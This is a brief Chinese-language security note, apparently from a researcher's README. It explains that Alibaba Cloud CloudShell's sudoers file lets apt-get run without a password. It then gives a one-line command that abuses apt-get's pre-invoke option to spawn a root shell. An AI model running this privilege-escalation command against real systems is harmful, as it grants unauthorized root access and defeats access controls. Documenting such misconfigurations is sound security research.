## CloudShell



阿里云CloudShell：

从`/etc/sudoers`中读取：

![image-20231116110834078](README.assets/image-20231116110834078.png)

apt-get执行sudo不需要输入密码，因此利用apt-get可以提权到root：

```bash
sudo apt-get update -o APT::update::pre-invoke::=/bin/bash
```

